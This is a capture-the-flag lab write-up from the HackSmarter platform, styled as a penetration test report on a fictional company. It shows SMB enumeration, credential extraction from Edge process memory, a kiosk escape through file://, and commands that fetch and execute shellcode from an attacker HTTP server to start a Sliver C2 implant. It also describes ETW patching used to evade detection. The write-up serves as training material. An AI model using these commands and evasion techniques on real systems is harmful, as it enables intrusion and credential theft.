---
title: "Edge"
platform: "HackSmarter"
category: "Credential Access"
difficulty: "Easy"
date: 2026-05-15
os: "Windows 11 / Server 2025"
tags: ["windows", "smb", "credential-dumping", "browser-exploitation", "edge", "app-bound-encryption", "edgesnapper", "vdi", "kiosk-bypass", "rdp", "sliver", "c2", "donut", "shellcode", "av-bypass", "lateral-movement", "putty", "winrm"]
---

<div style="text-align: center;">
  <img src="/assets/images/ctf/edge/banner.png" alt="Edge Banner" style="max-width: 100%;" />
</div>

---

## Scenario

Vantara is a private company formed in 2024 by billionaire Blairo Maggi's nephew, Ênio Rezende, under the Hut 8 / private equity umbrella. It operates as a hyperscale data center and AI infrastructure company, positioning itself as a vertically integrated AI infrastructure provider — owning the physical layer (land, power, buildings) through to the compute layer — competing directly with CoreWeave, DataBank, and similar operators.

The client requested an assumed-breach penetration test to validate the security posture of the environment and identify any material risk before the next audit cycle.


---

## Executive Summary

- **Writable SMB Share** — `jmorris` had READ/WRITE access to the `VantaraOps` share, exposing operational documents including IT helpdesk logs that disclosed vulnerable accounts.
- **Edge App-Bound Encryption Bypass** — Microsoft Edge 127+ uses v20 App-Bound Encryption, rendering disk-based tools like SharpChrome ineffective. Live process memory extraction via EdgeSnapper recovered plaintext credentials.
- **VDI Kiosk Escape** — The `svc_vdi` account landed in a locked-down Plant Operations VDI kiosk running in Edge. The `file://` protocol handler was abused to execute a pre-staged shellcode runner, establishing a Sliver C2 session.
- **Plaintext Credential in PuTTY Configuration** — A provisioning script in the VDI user's Documents folder contained the `svc_vdi_mgmt` password in plaintext.
- **Full Administrative Access** — `svc_vdi_mgmt` held a complete administrative privilege set including `SeDebugPrivilege` and `SeImpersonatePrivilege`.

**Risk Rating:** Critical

---

# Enumeration

## SMB Share Enumeration

Authenticate as `jmorris` and enumerate accessible SMB shares. The `-signing:False` flag in the output is a critical finding — when SMB message signing is not enforced, an attacker can perform NTLM relay attacks without cracking any hashes.

```bash
nxc smb 10.0.16.97 -u jmorris -p '<redacted>' --shares
```

```
SMB         10.0.16.97      445    VANTARAOPS       [*] Windows 11 / Server 2025 Build 26100 x64 (name:VANTARAOPS) (domain:VantaraOps) (signing:False) (SMBv1:None)
SMB         10.0.16.97      445    VANTARAOPS       [+] VantaraOps\jmorris:<redacted>
SMB         10.0.16.97      445    VANTARAOPS       [*] Enumerated shares
SMB         10.0.16.97      445    VANTARAOPS       Share           Permissions     Remark
SMB         10.0.16.97      445    VANTARAOPS       -----           -----------     ------
SMB         10.0.16.97      445    VANTARAOPS       ADMIN$                          Remote Admin
SMB         10.0.16.97      445    VANTARAOPS       C$                              Default share
SMB         10.0.16.97      445    VANTARAOPS       IPC$            READ            Remote IPC
SMB         10.0.16.97      445    VANTARAOPS       VantaraOps      READ,WRITE      Vantara Industries Operations Share
```

`jmorris` has **READ/WRITE** access to the `VantaraOps` share. Write access enables placing malicious files (`.lnk`, `.scf`) to coerce NTLM authentication from any user who browses the share.

## Port Scan

```bash
nmap -sCV -Pn 10.0.16.97
```

```
Starting Nmap 7.93 ( https://nmap.org ) at 2026-05-12 22:40 PDT
Nmap scan report for 10.0.16.97
Host is up (0.070s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE            VERSION
135/tcp  open  msrpc              Microsoft Windows RPC
445/tcp  open  microsoft-ds?
3389/tcp open  ssl/ms-wbt-server?
| rdp-ntlm-info:
|   Target_Name: VANTARAOPS
|   NetBIOS_Domain_Name: VANTARAOPS
|   NetBIOS_Computer_Name: VANTARAOPS
|   DNS_Domain_Name: VantaraOps
|   DNS_Computer_Name: VantaraOps
|   Product_Version: 10.0.26100
|_  System_Time: 2026-05-13T05:41:45+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   311:
|_    Message signing enabled but not required
```

Three key findings: SMB signing not required (NTLM relay potential), RDP exposed on 3389, and OS Build 10.0.26100 confirming Windows 11 / Server 2025.

## Share Content Enumeration

`spider_plus` recursively crawls all accessible share content and saves file metadata to a structured JSON file — far faster than manually listing subdirectories.

```bash
nxc smb 10.0.16.97 -u jmorris -p '<redacted>' -M spider_plus
```

```
SPIDER_PLUS 10.0.16.97      445    VANTARAOPS       [*] SMB Shares:           4 (ADMIN$, C$, IPC$, VantaraOps)
SPIDER_PLUS 10.0.16.97      445    VANTARAOPS       [*] SMB Writable Shares:  1 (VantaraOps)
SPIDER_PLUS 10.0.16.97      445    VANTARAOPS       [*] Total folders found:  9
SPIDER_PLUS 10.0.16.97      445    VANTARAOPS       [*] Total files found:    22
SPIDER_PLUS 10.0.16.97      445    VANTARAOPS       [+] Saved share-file metadata to "/root/.nxc/modules/nxc_spider_plus/10.0.16.97.json".
```

```json
{
  "VantaraOps": {
    "IT/helpdesk_log.txt":       { "size": "675 B" },
    "IT/password_policy.txt":    { "size": "674 B" },
    "Scripts/workstation_health.bat": { "size": "844 B" },
    "Finance/Q1_2024_summary.txt": { "size": "637 B" },
    "HR/org_chart.txt":          { "size": "1.5 KB" },
    "Reports/weekly_production_20260508.txt": { "size": "294 B" }
  }
}
```

`Scripts/workstation_health.bat` stands out — an executable batch script in a share where `jmorris` has write access suggests a scheduled task may be invoking it periodically, making it a candidate for payload replacement.

## IT Document Analysis

The IT documents reveal high-value intelligence about domain accounts.

```bash
cat helpdesk_log.txt
```

```
Vantara Industries — Helpdesk Ticket Log (Recent)
2026-05-09

INC0044112  jmorris     LOW     Ops Portal not launching on WS04            IN PROGRESS
INC0044001  svc_backup  MEDIUM  Weak password reported by plant staff        IN PROGRESS
INC0043998  mpatel      LOW     Keyboard replacement — CNC-01 workstation    CLOSED
INC0043887  tricci      LOW     Printer offline — 10.10.10.25               CLOSED
INC0043801  lchen       LOW     VPN token reset                             CLOSED
INC0039201  asrep_svc   HIGH    Legacy acct pre-auth disabled — decom req   IN PROGRESS
INC0038774  bthompson   LOW     New monitor request — Plant Manager office   CLOSED
```

```bash
cat password_policy.txt
```

```
Vantara Industries — IT Password Policy (Summary)
Effective: 2024-01-01

Standard user accounts:   Min 12 chars, complexity required, 90-day expiry
Service accounts:         Min 16 chars, complexity required, no expiry
Kiosk accounts:           Managed by IT — do not share

Accounts flagged in last audit:
  svc_backup — password noted as weak by plant staff (INC0044001 open)
  asrep_svc  — pre-auth disabled, pending decommission (INC0039201 open)

Lockout: 5 bad attempts, 15-minute lockout
```

Two accounts are immediately actionable:

- **`asrep_svc`** — Kerberos pre-authentication disabled. Vulnerable to AS-REP Roasting — an attacker can request an AS-REP ticket and receive an encrypted blob crackable offline without any credentials.
- **`svc_backup`** — Flagged internally for a weak password. High-value target given service accounts often carry elevated privileges.

The mention of **Kiosk accounts** hints at a restricted kiosk environment elsewhere on the network.

---

# Credential Extraction — Microsoft Edge

## WinRM Foothold

With `jmorris` credentials, a WinRM session was established. Microsoft Edge was actively running on the workstation, making browser credential extraction the primary objective.

## Attempted Extraction with SharpChrome (Blocked by App-Bound Encryption)

SharpChrome extracts browser saved-login databases by decrypting the SQLite `Login Data` file using Windows DPAPI. To bypass Defender, it was converted to position-independent shellcode via **Donut** — a tool that wraps PE/.NET assemblies into a self-contained shellcode blob that executes entirely in memory. A custom polymorphic Go runner (`runner.exe`) fetches the base64-encoded shellcode over HTTP, decodes it, allocates an RWX region via `VirtualAlloc`, copies the shellcode with `RtlMoveMemory`, and executes it via `CreateThread` — leaving no binary artifacts on disk.

```powershell
.\runner.exe -remote http://10.200.56.28:8000/sharpchrome.enc
```

```
[+] Shellcode decoded. Executing...

  __                 _
 (_  |_   _. ._ ._  /  |_  ._ _  ._ _   _
 __) | | (_| |  |_) \_ | | | (_) | | | (/_
                |
  v1.12.0

[*] Action: Edge Saved Logins Triage
[*] Using AES State Key: <redacted>]
[*] Triaging Edge Logins for current user

[!] Unhandled SharpChrome exception:

System.ArgumentException: Destination array is not long enough to copy all the items in the collection. Check array index and length.
   at System.BitConverter.ToInt32(Byte[] value, Int32 startIndex)
   at SharpDPAPI.Dpapi.DescribeDPAPIBlob(Byte[] blobBytes, Dictionary`2 MasterKeys, String blobType, ...)
   at SharpChrome.Chrome.ParseChromeLogins(...)
```

SharpChrome v1.12.0 crashed with a buffer length error inside the DPAPI blob parser. **Microsoft Edge 127 and later** introduced **App-Bound Encryption (v20)**, which wraps the AES state key in an additional layer tied to the browser's process identity via a COM-based elevation service. SharpChrome was written against the legacy v10 blob format and cannot parse v20 blobs — causing it to misparse the credential blob header and overflow the destination array.

## Process Memory Extraction with EdgeSnapper

Since App-Bound Encryption protects credentials on disk, the approach shifts to extracting them directly from the **live browser process memory**, where Edge has already performed decryption for active use.

[EdgeSnapper](https://github.com/Dragkob/EdgeSnapper) uses the Windows `PssCaptureSnapshot` API — designed for crash dump collection — to take a frozen, consistent snapshot of the running `msedge.exe` process. It then scans snapshot memory regions for credential patterns, recovering plaintext usernames and passwords from decrypted memory.

```powershell
.\edge.exe
```

```
[*] Scanning processes for msedge.exe
[+] Found msedge.exe at PID 6268

[*] Creating handle to process 6268
[+] Handle to process acquired!

[*] Attempting Process Snapshot...
[+] Process successfully Snapshotted!

[*] Scanning frozen snapshot regions...
------------------------------------------
Username/eMail: jmorris
Password:       <redacted>
------------------------------------------
Username/eMail: jmorris
Password:       <redacted>
------------------------------------------
Username/eMail: sburns
Password:       <redacted>
------------------------------------------
Username/eMail: jmorris
Password:       <redacted>
------------------------------------------
Username/eMail: svc_vdi
Password:       <redacted>

[*] Task complete.
```

Five credential sets recovered. The most significant: **`svc_vdi`** — a service account associated with the VDI environment referenced in the IT password policy.

## Credential Validation

```bash
nxc smb 10.1.36.192 -u svc_vdi -p '<redacted>'
```

```
SMB         10.1.36.192     445    VANTARAOPS       [*] Windows 11 / Server 2025 Build 26100 x64 (name:VANTARAOPS) (domain:VantaraOps) (signing:False) (SMBv1:None)
SMB         10.1.36.192     445    VANTARAOPS       [+] VantaraOps\svc_vdi:<redacted>
```

Authentication succeeded against a second host — valid lateral movement credentials confirmed.

**Credentials:** `svc_vdi` : `<redacted>`

---

# VDI Kiosk Bypass

## Accessing the VDI

Authenticating to `10.1.36.192` via RDP as `svc_vdi` drops the session into a locked-down VDI running **Plant Operations VDI v4.2.1** — an ICS-style operator dashboard for monitoring facility functions.

<div style="text-align: center;">
  <img src="/assets/images/ctf/edge/vdi-login.png" alt="RDP Login as svc_vdi" style="max-width: 100%;" />
</div>

The interface presents a simulated industrial control panel. Despite the operational appearance, no ICS-specific ports (Modbus/502, DNP3/20000) were present in the initial scan — this is a front-end display layer rather than a live control system.

<div style="text-align: center;">
  <img src="/assets/images/ctf/edge/vdi-dashboard.png" alt="Plant Operations VDI Dashboard" style="max-width: 100%;" />
</div>

The dashboard exposes start/stop controls for plant functions and includes an embedded hyperlink.

<div style="text-align: center;">
  <img src="/assets/images/ctf/edge/vdi-link.png" alt="Embedded Link in VDI Dashboard" style="max-width: 100%;" />
</div>

The link resolves to a dead URL. However, its presence confirms the VDI session runs inside **Microsoft Edge in kiosk mode** — which still processes `file://` protocol URIs entered directly into the address bar.

<div style="text-align: center;">
  <img src="/assets/images/ctf/edge/vdi-deadlink.png" alt="Dead Link in VDI" style="max-width: 100%;" />
</div>

## Exploiting the file:// Protocol Handler

Entering a local executable path using the `file://` scheme causes Edge to surface a native OS open/run dialog for the target binary. This bypasses the kiosk restriction because Edge's `file://` handler defers execution decisions to the Windows shell, which presents a standard prompt regardless of kiosk policy.

```
file://C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```

<div style="text-align: center;">
  <img src="/assets/images/ctf/edge/file-protocol-exec.png" alt="file:// Protocol Triggering Execution Dialog" style="max-width: 100%;" />
</div>

The kiosk environment blocked direct keyboard input in certain UI fields, but **RDP clipboard redirection remained functional**. Commands were composed on the attacker machine and pasted into the Edge address bar via `Ctrl+V`.

## Sliver Implant Delivery

A pre-staged `runner.exe` was already present at `C:\Scripts\runner.exe` from the earlier WinRM access. The Sliver C2 implant shellcode was served from the attacker's Python HTTP server. The following was pasted into the Edge address bar:

```
file://C:\Scripts\runner.exe -remote http://10.200.56.28:8000/implant.enc
```

The runner fetches the base64-encoded Donut shellcode blob over HTTP, decodes it, allocates a `PAGE_EXECUTE_READWRITE` memory region via `VirtualAlloc`, copies the shellcode using `RtlMoveMemory`, and spawns it via `CreateThread`. Before execution, it patches ETW (Event Tracing for Windows) by overwriting the first byte of `EtwEventWrite` in `ntdll.dll` with a `0xC3` (`RET`) instruction, neutralizing telemetry-based detection.

<div style="text-align: center;">
  <img src="/assets/images/ctf/edge/sliver-session.png" alt="Sliver MTLS Session Established" style="max-width: 100%;" />
</div>

```
[*] Session 7662fa6d SILLY_WAX - 10.1.36.192:53474 (VantaraOps) - windows/amd64 - Thu, 14 May 2026 23:53:47 PDT

[server] sliver (SILLY_WAX) > whoami

Logon ID: VANTARAOPS\svc_vdi
[*] Current Token ID: VANTARAOPS\svc_vdi
```

## svc_vdi Token Enumeration

```
[server] sliver (SILLY_WAX) > sa-whoami

UserName                SID
====================== ====================================
VANTARAOPS\svc_vdi      S-1-5-21-1528218548-1961715703-1402555335-1001

Privilege Name                Description                          State
============================= ==================================== ========
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
```

`svc_vdi` runs at **Medium Integrity** with a minimal privilege set — no `SeImpersonatePrivilege`, no `SeDebugPrivilege`. Direct potato-family escalation is not viable from this context. Filesystem access is still valuable for credential discovery.

---

# Lateral Movement — PuTTY Configuration

## Discovery

Enumerating the `svc_vdi` user's Documents folder via the Sliver session reveals a PowerShell-based PuTTY configuration script.

```
[server] sliver (SILLY_WAX) > ls C:\\users\\svc_vdi.VANTARAOPS\\Documents

C:\users\svc_vdi.VANTARAOPS\Documents (6 items, 5.5 KiB)
========================================================
-rw-rw-rw-  desktop.ini  402 B    Sat May 09 12:40:13 +0000 2026
-rw-rw-rw-  putty.conf   1.1 KiB  Sun May 10 13:16:33 +0000 2026
```

## Plaintext Credentials in Provisioning Script

```
[server] sliver (SILLY_WAX) > cat C:\\users\\svc_vdi.VANTARAOPS\\Documents\\putty.conf
```

```powershell
$session = "VDI-MGMT"

New-Item -Path "HKCU:\Software\SimonTatham\PuTTY\Sessions\$session" -Force | Out-Null

Set-ItemProperty -Path "HKCU:\Software\SimonTatham\PuTTY\Sessions\$session" -Name HostName   -Value "10.10.10.25"
Set-ItemProperty -Path "HKCU:\Software\SimonTatham\PuTTY\Sessions\$session" -Name Protocol   -Value "ssh"
Set-ItemProperty -Path "HKCU:\Software\SimonTatham\PuTTY\Sessions\$session" -Name PortNumber -Value 22
Set-ItemProperty -Path "HKCU:\Software\SimonTatham\PuTTY\Sessions\$session" -Name UserName   -Value "svc_vdi_mgmt"
Set-ItemProperty -Path "HKCU:\Software\SimonTatham\PuTTY\Sessions\$session" -Name Password   -Value "<redacted>"
```

PuTTY does not natively support a `Password` registry value — this credential was written as part of a provisioning script and never cleaned up. The target host `10.10.10.25` matches the IP from the helpdesk log (`tricci — Printer offline — 10.10.10.25`), confirming it is a live internal system.

**Credentials:** `svc_vdi_mgmt` : `<redacted>`

---

# Privilege Escalation — svc_vdi_mgmt

## WinRM Access and Administrative Privilege Confirmation

```bash
evil-winrm -i 10.1.36.192 -u svc_vdi_mgmt -p '<redacted>'
```

```
Evil-WinRM shell v3.9

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_vdi_mgmt\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
```

Full administrative context confirmed. Key privileges:

- **`SeDebugPrivilege`** — Permits attaching a debugger to any process including `lsass.exe`, enabling direct credential extraction from LSASS memory without a SYSTEM token.
- **`SeImpersonatePrivilege`** — Enables impersonating any authenticating client. Combined with a potato-family exploit (GodPotato, PrintSpoofer), this achieves `NT AUTHORITY\SYSTEM` impersonation.
- **`SeBackupPrivilege`** — Grants read access to any file regardless of ACLs, including the SAM database and SYSTEM hive for offline hash extraction.
- **`SeLoadDriverPrivilege`** — Allows loading arbitrary kernel-mode drivers, enabling kernel-level code execution.
- **`SeTakeOwnershipPrivilege`** — Permits taking ownership of any securable object, enabling access to files and registry keys otherwise restricted.

Full control of the host achieved. Engagement objectives met.

---

## Credentials Summary

```
Phase 1 - Initial Access
────────────────────────────────────────────────────────────────
jmorris         : <redacted>           → Provided (assumed breach)

Phase 2 - Lateral Movement
────────────────────────────────────────────────────────────────
svc_vdi         : <redacted>             → EdgeSnapper memory dump

Phase 3 - Privilege Escalation
────────────────────────────────────────────────────────────────
svc_vdi_mgmt    : <redacted>         → PuTTY provisioning script
```

---

## Tools Used

- **NetExec (nxc)** — SMB share enumeration, credential validation, `spider_plus` share crawling
- **Nmap** — Port scanning and service fingerprinting
- **Evil-WinRM** — Initial WinRM foothold and final admin shell
- **Donut** — PE/.NET to position-independent shellcode conversion for AV evasion
- **Custom Go Runner** (`runner.exe`) — Polymorphic shellcode loader (VirtualAlloc / RtlMoveMemory / CreateThread) with ETW patching
- **SharpChrome** — Attempted Edge credential extraction (failed — v20 App-Bound Encryption)
- **EdgeSnapper** — Live Edge process memory snapshot via `PssCaptureSnapshot` for plaintext credential recovery
- **Sliver C2** — MTLS implant delivery and post-exploitation

---

## References

- [EdgeSnapper — Process Memory Credential Extraction](https://github.com/Dragkob/EdgeSnapper)
- [Microsoft Edge App-Bound Encryption (v20)](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [HackTricks — Windows Privilege Escalation — Tokens](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens)
- [Donut — In-Memory Shellcode Generation](https://github.com/TheWover/donut)
- [Sliver C2 Framework](https://github.com/BishopFox/sliver)
